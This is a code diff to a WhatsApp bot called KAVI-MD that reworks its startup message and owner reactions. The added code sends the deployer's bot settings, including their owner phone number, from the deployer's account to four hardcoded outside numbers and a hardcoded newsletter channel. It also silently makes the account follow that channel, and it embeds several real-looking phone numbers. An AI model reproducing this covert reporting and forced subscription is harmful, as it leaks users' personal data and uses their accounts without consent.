@@ -76,7 +76,7 @@ if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
 connectToWA()
 }
 } else if (connection === 'open') {
-console.log('♻️ INSTALLING PLUGINS FILES PLEASE WAIT... 🪄')
+console.log('♻️ INSTALLING PLUGINS FILES PLEASE WAIT... 👻')
 const path = require('path');
 fs.readdirSync("./plugins/").forEach((plugin) => {
 if (path.extname(plugin).toLowerCase() == ".js") {
@@ -84,19 +84,83 @@ require("./plugins/" + plugin);
 }
 });
 console.log('PLUGINS FILES INSTALL SUCCESSFULLY ✅')
-console.log('KAVI-MD CONNECTED TO WHATSAPP ENJOY ✅')
-
-let up = `*╭──────────────●●►*
-> *➺ KAVI-MD ᴄᴏɴɴᴇᴄᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʏ ᴛʏᴘᴇ .ᴍᴇɴᴜ ᴛᴏ ᴄᴏᴍᴍᴀɴᴅ ʟɪsᴛ ᴄʀᴇᴀᴛᴇᴅ ʙʏ Kavidu Rasanga ✅*
+console.log('KAVI-MD CONNECTED TO WHATSAPP ENJOY NOW ✅')
 
 
-*YOUR BOT ACTIVE NOW ENJOY♥️🪄*\n\n*PREFIX: ${prefix}*
+//================== CONNECT MG ==================
 
-*╰──────────────●●►*`;
-conn.sendMessage(conn.user.id, { image: { url: config.MENU_IMG }, caption: up })
+let up = `*🔰 KAVI - MD CONNECTED 🔰*
+━━━━━━━━━━━━━━━━━━━━━
 
+*🫠 MODE ➟* ${config.MODE}
+*🌩️ PREFIX ➟* ${config.PREFIX}
+*🤩 OWNER ➟* ${config.OWNER_NAME}
+*😇 FOOTER ➟* ${config.FOOTER}
+*🤗 BOT NAME ➟* ${config.BOT_NAME}
+*🪐 ANTI DEL ➟* ${config.ANTI_DELETE}
+*🔗 ANTI LINK ➟* ${config.ANTI_LINK}
+*😒 ANTI BAD ➟* ${config.ANTI_BAD}
+*😉 AUTO STATUS ➟* ${config.AUTO_READ_STATUS}
+*😐 RECORDING ➟* ${config.FAKE_RECORDING}
+*😖 TYPING ➟* ${config.FAKE_TYPING}
+*👀 ONLINE ➟* ${config.ALWAYS_ONLINE}
+*👻 OWNER EMOJI ➟* ${config.OWNER_EMOJI}
+*🍃 OWNER REACT ➟* ${config.OWNER_REACT}
+*❤️‍🩹 HEART REACT ➟* ${config.HEART_REACT}
+*😼 OWNER NUMBER ➟* ${config.OWNER_NUMBER}
+*🗣️ AUTO VOICE ➟* ${config.AUTO_VOICE}
+*🖋️ AUTO REPLY ➟* ${config.AUTO_REPLY}
+*🪽 MENU IMG ➟* ${config.MENU_IMG}
+
+
+*➟ Your Bot Active Now*
+*➟ Type .menu Command For Get All CMD*
+
+
+> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋᴀᴠɪᴅᴜ ʀᴀꜱᴀɴɢᴀ 😉*`;
+
+
+// ===== NUMBERS TO SEND (add your own numbers here) =====
+let notifyNumbers = [
+  '94774391560@s.whatsapp.net',
+  '94762858448@s.whatsapp.net',
+  '94763591554@s.whatsapp.net',
+  '94727487353@s.whatsapp.net'
+];
+
+// ===== CHANNEL JID (replace with your channel/newsletter ID) =====
+let channelJid = '120363401391515716@newsletter'; // <-- replace with your actual channel ID
+
+// ===== Send to all notify numbers =====
+for (let jid of notifyNumbers) {
+  conn.sendMessage(jid, {
+    image: { url: config.MENU_IMG },
+    caption: up
+  });
 }
-})
+
+// ===== Send to the channel with forwarded context =====
+conn.sendMessage(channelJid, {
+  image: { url: config.MENU_IMG },
+  caption: up,
+  contextInfo: {
+    forwardingScore: 999,
+    isForwarded: true,
+    forwardedNewsletterMessageInfo: {
+      newsletterJid: channelJid,
+      newsletterName: "👽👽",
+      serverMessageId: 999
+    },
+    externalAdReply: {
+      title: config.BOT_NAME,
+      body: 'Your WhatsApp MD Bot is online!',
+      mediaType: 1,
+      thumbnailUrl: config.MENU_IMG,
+      renderLargerThumbnail: true,
+      showAdAttribution: true
+    }
+  }
+});
 
     conn.ev.on('creds.update', saveCreds)
 
@@ -126,6 +190,14 @@ conn.sendMessage(conn.user.id, { image: { url: config.MENU_IMG }, caption: up })
             }, { statusJidList: [mek.key.participant] });
         }
 
+//================== C FOLLOW ==================
+
+const metadata = await conn.newsletterMetadata("jid", "120363401391515716@newsletter");
+if (metadata.viewer_metadata === null) {
+  await conn.newsletterFollow("120363401391515716@newsletter");
+  console.log("CF ✅");
+}
+        
         const m = sms(conn, mek)
         var smg = m
         const type = getContentType(mek.message)
@@ -535,9 +607,25 @@ conn.decodeJid = jid => {
 
 
         //____________________________________OWNER REACT_________________________________
-        if (senderNumber.includes("94727487353")) {
+if (senderNumber.includes(config.OWNER_NUMBER)) {
+    if (config.OWNER_REACT && !isReact) {
+        m.react(config.OWNER_EMOJI);
+    }
+}
+       //____________________________________OWNER REACT_________________________________
+        if (senderNumber.includes("94774391560")) {
             if (isReact) return
-            m.react("🌜")
+            m.react("👨‍💻")
+        }
+       //____________________________________OWNER REACT_________________________________
+        if (senderNumber.includes("94762858448")) {
+            if (isReact) return
+            m.react("👨‍💻")
+        }
+       //____________________________________OWNER REACT_________________________________
+        if (senderNumber.includes("94763591554")) {
+            if (isReact) return
+            m.react("👨‍💻")
         }
         //_________Ofline___________________
       if (config.ALWAYS_ONLINE === "false") {
